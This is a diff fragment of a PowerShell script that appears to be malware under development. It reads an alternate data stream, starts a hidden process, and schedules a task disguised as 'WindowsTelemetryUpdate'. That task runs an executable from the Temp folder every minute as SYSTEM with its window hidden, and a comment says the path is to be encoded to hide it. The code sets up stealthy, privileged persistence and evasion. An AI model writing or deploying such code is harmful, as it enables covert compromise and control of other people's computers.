@@ -25,6 +25,6 @@ if (Get-Item -Path $adsStream -ErrorAction SilentlyContinue) {
     [System.Diagnostics.Process]::Start($psi)
 
     # === STEP 5: Scheduled Task ===
-    # WORKING HERE TO ENCODE THIS
+    # WORKING HERE TO ENCODE THIS TO PROTECT PATH
     schtasks /Create /SC MINUTE /MO 1 /TN "WindowsTelemetryUpdate" /TR "powershell.exe -NoProfile -WindowStyle Hidden -Command Start-Process '$env:Temp\TelemetryService.exe' -ArgumentList gui -WindowStyle Hidden" /RU SYSTEM /F
 }
